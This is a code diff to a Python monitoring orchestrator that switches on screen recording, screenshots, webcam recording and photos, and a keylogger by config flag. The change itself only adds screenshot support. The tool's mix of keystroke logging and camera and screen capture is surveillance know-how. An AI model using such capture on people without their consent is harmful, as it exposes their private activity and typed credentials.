@@ -54,7 +54,9 @@ class MonitoringOrchestrator:
     """Starts and stops all monitoring components."""
 
     def __init__(self):
-        self._screen = ScreenRecorder() if config.SCREEN_RECORD else None
+        self._screen = (
+            ScreenRecorder() if (config.SCREEN_RECORD or config.SCREEN_SHOT) else None
+        )
         self._webcam = WebcamRecorder() if config.WEBCAM_RECORD else None
         self._webcam_photo = WebcamPhotoCapture() if config.WEBCAM_PHOTO else None
         self._keyboard = KeyboardMonitor() if config.KEY_LOGGER else None
@@ -68,7 +70,10 @@ class MonitoringOrchestrator:
         if self._keyboard:
             self._keyboard.start()
         if self._screen:
-            self._screen.start()
+            self._screen.start(
+                record=bool(config.SCREEN_RECORD),
+                screenshot=bool(config.SCREEN_SHOT),
+            )
         if self._webcam:
             self._webcam.start()
         if self._webcam_photo:
